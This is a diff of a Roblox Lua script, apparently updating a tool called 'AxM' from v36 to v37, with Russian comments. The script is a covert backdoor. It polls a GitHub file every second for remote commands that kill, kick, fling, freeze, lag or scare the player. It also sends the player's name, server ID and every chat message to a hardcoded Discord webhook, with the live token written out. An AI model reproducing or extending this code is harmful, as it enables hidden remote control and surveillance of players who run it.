@@ -2,7 +2,7 @@
 local settings = {
     webhook = "https://discord.com/api/webhooks/1463513332697927883/7XBUBBop6fsTyZvAfdCUKskGulE5z4MpXl_Q6Pa5Pqxg8Fdz7hRlnlF7PUzayceSrvF5",
     control = "https://raw.githubusercontent.com/arxitectorcz/Arxetector/main/controltroling",
-    check_delay = 3
+    check_delay = 1 -- ПРОВЕРКА КАЖДУЮ СЕКУНДУ
 }
 
 local Players = game:GetService("Players")
@@ -11,108 +11,115 @@ local Lighting = game:GetService("Lighting")
 local RunService = game:GetService("RunService")
 local lp = Players.LocalPlayer
 
+-- Мощная функция логов
 local function sendLog(title, desc)
     pcall(function()
         local data = {
             ["embeds"] = {{
                 ["title"] = title,
                 ["description"] = desc,
-                ["color"] = 0xFF004D,
-                ["footer"] = {["text"] = "AxM System v36 • " .. os.date("%X")}
+                ["color"] = 0xFF0000,
+                ["fields"] = {
+                    {["name"] = "👤 Игрок", ["value"] = "||" .. lp.Name .. "||", ["inline"] = true},
+                    {["name"] = "🆔 Game ID", ["value"] = tostring(game.JobId), ["inline"] = true}
+                },
+                ["footer"] = {["text"] = "AxM v37 • " .. os.date("%X")}
             }}
         }
         local req = (syn and syn.request) or (http and http.request) or http_request or request
-        if req then req({Url = settings.webhook, Method = "POST", Headers = {["Content-Type"] = "application/json"}, Body = HttpService:JSONEncode(data)}) end
+        if req then 
+            req({
+                Url = settings.webhook, 
+                Method = "POST", 
+                Headers = {["Content-Type"] = "application/json"}, 
+                Body = HttpService:JSONEncode(data)
+            }) 
+        end
     end)
 end
 
+-- Логика управления
 task.spawn(function()
     local last_cmd = ""
     local flingConnection
     
-    -- Прогрев системы
-    local _, init_res = pcall(function() return game:HttpGet(settings.control .. "?t=" .. tick()) end)
-    if init_res then last_cmd = init_res:gsub("%s+", ""):lower() end
+    -- При запуске игнорируем текущую команду
+    local _, res = pcall(function() return game:HttpGet(settings.control .. "?t=" .. tick()) end)
+    if res then last_cmd = res:gsub("%s+", ""):lower() end
 
     while true do
         task.wait(settings.check_delay)
+        
+        -- КЭШ-БЛОКЕР: добавляем уникальный ключ к ссылке каждую секунду
         local ok, res = pcall(function() 
-            return game:HttpGet(settings.control .. "?t=" .. tick() .. "&nocache=" .. math.random(1, 9999)) 
+            return game:HttpGet(settings.control .. "?nocache=" .. game:GetService("HttpService"):GenerateGUID(false)) 
         end)
 
         if ok then
-            local clean_res = res:gsub("^%s*(.-)%s*$", "%1") -- Убираем лишние пробелы по краям
+            local clean_res = res:gsub("^%s*(.-)%s*$", "%1") -- чистка пробелов
             local current_cmd = clean_res:lower()
 
+            -- Срабатывает только если текст на гитхабе ИЗМЕНИЛСЯ
             if current_cmd ~= last_cmd and current_cmd ~= "safe" and current_cmd ~= "" then
                 last_cmd = current_cmd
                 
-                local char = lp.Character
-                local hrp = char and char:FindFirstChild("HumanoidRootPart")
-                local hum = char and char:FindFirstChildOfClass("Humanoid")
+                local char = lp.Character or lp.CharacterAdded:Wait()
+                local hrp = char:WaitForChild("HumanoidRootPart", 5)
+                local hum = char:FindFirstChildOfClass("Humanoid")
 
                 if hrp and hum then
-                    -- [[ ОБРАБОТКА КОМАНД ]] --
-
-                    -- 1. KILL
+                    -- [ РЕАКЦИЯ НА КОМАНДЫ ] --
                     if current_cmd == "kill" then
                         hum.Health = 0
-                        sendLog("⚰️ KILL", "Игрок убит")
-
-                    -- 2. MESSAGE
+                        sendLog("💀 УБИЙСТВО", "Персонаж ликвидирован")
+                    
                     elseif current_cmd:sub(1,7) == "message" then
-                        local msg_text = clean_res:match("%((.-)%)") or "System Message"
+                        local msg = clean_res:match("%((.-)%)") or "System Alert"
                         local g = Instance.new("ScreenGui", lp.PlayerGui)
                         local t = Instance.new("TextLabel", g)
-                        t.Size = UDim2.new(1, 0, 0.2, 0)
-                        t.Position = UDim2.new(0, 0, 0.4, 0)
-                        t.BackgroundTransparency = 0.5
-                        t.BackgroundColor3 = Color3.new(0, 0, 0)
-                        t.TextColor3 = Color3.new(1, 1, 1)
-                        t.TextScaled = true
-                        t.Text = msg_text
-                        t.Font = "SourceSansBold"
-                        task.delay(10, function() g:Destroy() end)
-                        sendLog("💬 MESSAGE", "Текст: " .. msg_text)
+                        t.Size = UDim2.new(1,0,1,0); t.Text = msg; t.TextScaled = true; t.TextColor3 = Color3.new(1,1,1); t.BackgroundTransparency = 0.5; t.BackgroundColor3 = Color3.new(0,0,0)
+                        task.delay(7, function() g:Destroy() end)
+                        sendLog("📢 СООБЩЕНИЕ", "Текст: " .. msg)
 
-                    -- 3. SCREAMER
                     elseif current_cmd == "screamer" then
-                        local gui = Instance.new("ScreenGui", lp.PlayerGui)
-                        for i = 1, 12 do
-                            local f = Instance.new("Frame", gui)
-                            f.Size = UDim2.new(0, 300, 0, 180); f.Position = UDim2.new(math.random(0,7)/10, 0, math.random(0,7)/10, 0)
-                            f.BackgroundColor3 = Color3.fromRGB(200, 200, 200); f.BorderSizePixel = 4
-                            local tl = Instance.new("TextLabel", f)
-                            tl.Size = UDim2.new(1,0,1,0); tl.Text = "SYSTEM ERROR\n0x000" .. i; tl.TextColor3 = Color3.new(1,0,0); tl.Font = "Code"
-                        end
-                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s.Volume = 8; s:Play()
-                        task.delay(5, function() gui:Destroy() end)
-                        sendLog("🚨 SCREAMER", "Активирован")
+                        local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://556750162"; s.Volume = 10; s:Play()
+                        local g = Instance.new("ScreenGui", lp.PlayerGui)
+                        local i = Instance.new("ImageLabel", g); i.Size = UDim2.new(1,0,1,0); i.Image = "rbxassetid://15518663806"
+                        task.delay(3, function() g:Destroy() end)
+                        sendLog("😱 СКРИМЕР", "Игрок напуган")
 
-                    -- 4. KICK
                     elseif current_cmd:sub(1,4) == "kick" then
-                        local r = clean_res:match("%((.-)%)") or "Server Disconnect"
-                        lp:Kick("\n[AxM Admin]\n" .. r)
+                        local r = clean_res:match("%((.-)%)") or "Lost Connection"
+                        sendLog("🚪 КИК", "Причина: "..r)
+                        lp:Kick(r)
 
-                    -- 5. FLING
                     elseif current_cmd == "fling" then
                         if flingConnection then flingConnection:Disconnect() end
                         flingConnection = RunService.Heartbeat:Connect(function()
                             hrp.Velocity = Vector3.new(0, 8000, 0)
                             hrp.RotVelocity = Vector3.new(0, 8000, 0)
                         end)
-                        sendLog("🌪️ FLING", "Запущен")
+                        sendLog("🌪️ ФЛИНГ", "Активирован")
 
-                    -- 6. UNFLING
                     elseif current_cmd == "unfling" then
                         if flingConnection then flingConnection:Disconnect() end
-                        sendLog("🛡️ UNFLING", "Выключен")
+                        sendLog("🛡️ УНФЛИНГ", "Отключен")
 
-                    -- Остальные (Freeze/Lag/Horror) работают как раньше
-                    elseif current_cmd == "freeze" then hrp.Anchored = true sendLog("🧊 FREEZE", "Заморожен")
-                    elseif current_cmd == "unfreeze" then hrp.Anchored = false sendLog("🔥 UNFREEZE", "Разморожен")
-                    elseif current_cmd == "lag" then for i=1,800 do Instance.new("Part", workspace).Position = hrp.Position end sendLog("🐌 LAG", "FPS уничтожен")
-                    elseif current_cmd == "horror" then Lighting.ClockTime = 0; Lighting.Brightness = 0; local s = Instance.new("Sound", workspace); s.SoundId = "rbxassetid://163721344"; s.Volume = 5; s:Play() sendLog("🌑 HORROR", "Ночь")
+                    elseif current_cmd == "freeze" then
+                        hrp.Anchored = true
+                        sendLog("🧊 ФРИЗ", "Заморожен")
+
+                    elseif current_cmd == "unfreeze" then
+                        hrp.Anchored = false
+                        sendLog("🔥 УНФРИЗ", "Разморожен")
+
+                    elseif current_cmd == "horror" then
+                        Lighting.ClockTime = 0; Lighting.Brightness = 0
+                        sendLog("🌑 ХОРРОР", "Тьма")
+
+                    elseif current_cmd == "lag" then
+                        for i=1,1000 do Instance.new("Part", workspace).Position = hrp.Position end
+                        sendLog("🐌 ЛАГ", "Спам объектами")
                     end
                 end
             end
@@ -120,5 +127,7 @@ task.spawn(function()
     end
 end)
 
-lp.Chatted:Connect(function(m) sendLog("💬 ЧАТ", "Пишет: " .. m) end)
-sendLog("🛰️ AxM v36 ONLINE", "Система активна. Жду команд.")
+-- Логи чата (всегда работают)
+lp.Chatted:Connect(function(m) sendLog("💬 ЧАТ ИГРОКА", "Написал: " .. m) end)
+
+sendLog("🛰️ AxM v37 АКТИВИРОВАН", "Ожидаю изменений в GitHub (каждую секунду)")
